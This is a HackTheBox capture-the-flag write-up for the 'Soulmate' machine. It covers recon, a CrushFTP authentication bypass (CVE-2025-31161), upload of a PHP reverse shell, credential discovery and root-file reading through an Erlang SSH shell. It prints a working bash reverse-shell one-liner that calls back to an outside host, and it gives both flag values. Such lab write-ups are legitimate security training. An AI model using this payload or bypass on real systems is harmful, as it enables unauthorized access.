---
layout: writeup
title: "Soulmate – HackTheBox"
date: 2026-02-19
platform: HackTheBox
---

On today's hacking, i've worked on a Linux machine called Soulmate, from HackTheBox. It's defined as easy but it took me a bit to get all the flags so, let's see what it has.

![Soulmate](/assets/Soulmate/soulmate.png)

I've started with the current meta for CTF's, which is, opening with nmap. I ran the following command:

``nmap -p- --min-rate=5000 -Pn 10.129.1.254``

``p`` --> all ports

``min-rate=5000`` --> sending packets no slower than 5000 per second

``Pn`` --> Treat all hosts as online -- skip host discovery


![Soulmate](/assets/Soulmate/nmap1.png)

We got ports 22, 80 and 4369 open; web, ssh, and epmd. I've searched some information about this service because i'm not familiarized with it and it's referred to Erlang shell. We might need to dig deeper later on Erlang ssh, but for the moment let's run our second nmap command to check versions and get some more information

``nmap -p22,80,4369 -sCV 10.129.1.254``

![Soulmate](/assets/Soulmate/nmap2.png)

Nothing surprising at the moment, Nginx, common.

Let's see what has the web to offer us, we modify our file ``/etc/hosts`` to add the IP ``10.129.1.254`` and the domain name 
``soulmate.htb``
<!--more-->

![Soulmate](/assets/Soulmate/soulmate1.png)

Seems like it's a dating web page. I've tried moving arround the page but the only thing i'm able to do is creating a profile and nothing much:

![Soulmate](/assets/Soulmate/soulmate2.png)

![Soulmate](/assets/Soulmate/soulmate3.png)

After checking a bit the web, i've went back to the terminal, time to check if there is any hidden directory that we can spoof with feroxbuster
I ran the following command:

``feroxbuster -u http://soulmate.htb``

![Soulmate](/assets/Soulmate/feroxbuster.png)

I got no result, and it finished quite fast so I decided to run a second command that might give me more information about the web page:

``whatweb http://soulmate.htb``

![Soulmate](/assets/Soulmate/whatweb.png)

The web is using PHP. To fully clarify I've used Wappalyzer extension on firefox, it's a great extension that gives information about technologies that the web page is using. It's something I wanted to do long time ago, but for some reason I didn't add wappalyzer to my browser until today:

![Soulmate](/assets/Soulmate/wappalyzer.png)

Confirms the usage of php. So, let's run a second feroxbuster round but specifying the php format.

``feroxbuster -u http://soulmate.htb -x php``
``-u`` --> specify the url
``-x`` --> specify the format, file extension

To my surprise I didn't get any relevant information:

![Soulmate](/assets/Soulmate/feroxbuster2.png)

But we are not done yet with the directory fuzzing thingy. There is another tool I want to use here, it's ffuf:
``ffuf -u http://soulmate.htb -H "HOST: FUZZ.soulmate.htb" -w /usr/share/wordlists/dirb/small.txt``

``-u`` --> specify url
``-H`` --> specify where it will append the words from the wordlist
``-w`` --> wordlist directory path

![Soulmate](/assets/Soulmate/fuff.png)

![Soulmate](/assets/Soulmate/ffuf2.png)

Seems like there is a ftp.soulmate.htb here. After adding it to our ``/etc/hosts`` file and try to access we see this:

![Soulmate](/assets/Soulmate/ftpsoulmate.png)

CrushFTP, after reading a bit about this I found that there is a vulnerability that allows you to log in with Admin privileges, the CVE-2025-31161. This authbypass vulnerability requires the username of an existing user on the CrushFTP server, by default there is an user crushadmin, that's the one we will use.

``sudo git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161``

![Soulmate](/assets/Soulmate/cvehelp.png)

![Soulmate](/assets/Soulmate/cvesophiedee.png)

With the Admin privileges, I've started moving arround the ftp dashboard, and found a user admin tab where I can manage all the users accounts and see what do they store:

![Soulmate](/assets/Soulmate/ftpadmin.png)

The one that caught my eye was user ``ben``, because he has a folder that is ``webProd`` where all the php files are stored

![Soulmate](/assets/Soulmate/ftpadmin2.png)

What if I upload a evil php file that has a reverse shell inside and I try to access? That's the plan, so, I changed ben's password and logged as him

![Soulmate](/assets/Soulmate/ftpadmin3.png)

![Soulmate](/assets/Soulmate/ftpben.png)

``<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.215/4444 0>&1'"); ?>``

![Soulmate](/assets/Soulmate/reverseshell.png)

![Soulmate](/assets/Soulmate/reverseshell2.png)

Now it's time to prepare the terminal to be listening for port 4444 and try to access the evil shell php file, it can be done with ``curl`` or via browser:

![Soulmate](/assets/Soulmate/reverseshell3.png)

And we are in.
I didn't find anything relevant in the config files.
There is a folder called ``ben`` inside ``/home`` . I need to get access to ben shell.
Remember earlier when I said that this machine was clasified as "easy" but it took me a while to complete it? Here's where I got stuck. Tried checking the database with sqlite, the config php files and nothing. And then, reviewing this writeup, early, at the top, on the nmap, there is another service mentioned, ``erlang`` , and I started looking for anything related to that, it might give me the answer to my questions.
I ran the following command:



``ps aux | grep erlang`` 

![Soulmate](/assets/Soulmate/stuck1.png)

There are some files being used by root. 
I proceed then to start digging it a bit, and found gold on the ``start.escript`` file :]

![Soulmate](/assets/Soulmate/stuck2.png)



![Soulmate](/assets/Soulmate/benpassword.png)

ben's password in plain text waiting for me here. 

![Soulmate](/assets/Soulmate/userflag.png)

User flag --> ``c86bcf15e8697602b95fd94ebbeb48d7``

![Soulmate](/assets/Soulmate/userflag2.png)

For me, it wasn't easy.
Moving on on the privesc, time to work on the root flag. I did my usual commands (``sudo -l``, ``find / -perm -4000 2>/dev/null``...) to check for some extra permissions as ``ben`` but seems like I am as jailed as the previous user ``www-data`` . So I decided to learn about Erlang, and check the config files again
Erlang It's commonly used in telecommunications and real-time applications. When you see port **4369** open, that's **epmd** (Erlang Port Mapper Daemon), which acts as a name server for Erlang nodes, essentially keeping track of which Erlang processes are running and on which ports.

Erlang nodes communicate between themselves using a shared secret called a **cookie**. If you can get hold of that cookie, you can authenticate as a legitimate node and interact with the system, which is exactly what makes it interesting from a pentesting perspective.

In this machine, the Erlang shell accessible via SSH on port 2222 gave us a non-standard interface with its own set of commands, but powerful enough to read files from the system, including the root flag.


![Soulmate](/assets/Soulmate/erlangport.png)

Seems like the service starts whenever someone uses ssh via port 2222, so that's what I did, in order to see what Erlang can offer me:

``ssh -p 2222 ben@localhost``

``-p`` --> to specify the port

``localhost`` --> it's a local service so localhost or 127.0.0.1 would work

Judging by the aspect seems like a different ssh shell with different commands, but it can give us what we want, which is the root flag.

![Soulmate](/assets/Soulmate/erlangshell.png)

Using the command for help, I found that I can list files and specify the directory:

![Soulmate](/assets/Soulmate/erlangls.png)

And that's how we got the root flag! :]

![Soulmate](/assets/Soulmate/erlangcat.png)

Or that's what I thought. Cat function doesn't work here, but getting more information about Erlang on Internet I found that there is a specific function for reading files ``file:read_file()``

``file:read_file("/root/root.txt").``

![Soulmate](/assets/Soulmate/erlangfileread.png)

And now yes, that's the last flag from this machine. Wasn't easy, but we learned a lot that's all that matters.

Root flag --> ``74f2d680b4a56fed5c6fc3673dc086e1``


![Soulmate](/assets/Soulmate/rootflag.png)

![Soulmate](/assets/Soulmate/machinecompleted.png)

